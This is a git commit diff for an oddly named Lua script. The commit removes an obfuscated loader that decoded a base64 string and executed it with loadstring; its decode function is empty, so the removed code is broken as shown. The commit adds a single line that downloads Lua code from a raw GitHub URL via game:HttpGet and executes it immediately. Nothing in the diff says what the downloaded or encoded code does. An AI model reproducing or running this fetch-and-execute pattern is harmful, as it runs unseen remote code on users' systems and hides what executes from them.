59824accdf0099abbc201e3b2ee1072fa03ddde4
czcasdfwdk <165571219+czcasdfwdk@users.noreply.github.com>
2026-08-09 23:46:40 +0800

    Add

--- adfczcdyk-jzq.lut.lua
+++ adfczcdyk-jzq.lut.lua
@@ -4,14 +4,4 @@
 
 
 
-local encodedScript = "LS0tLS0g5L2g55qE5Y+N5Yir5pah5pys...
-
-local function decodeBase64(data)
-    
-end
-
-local scriptContent = decodeBase64(encodedScript)
-local func, err = loadstring(scriptContent)
-if func then
-    pcall(func)
-end
+loadstring(game:HttpGet("https://raw.githubusercontent.com/czcasdfwdk/dyk--czc/main/synbdyknbhhhh.lua"))()
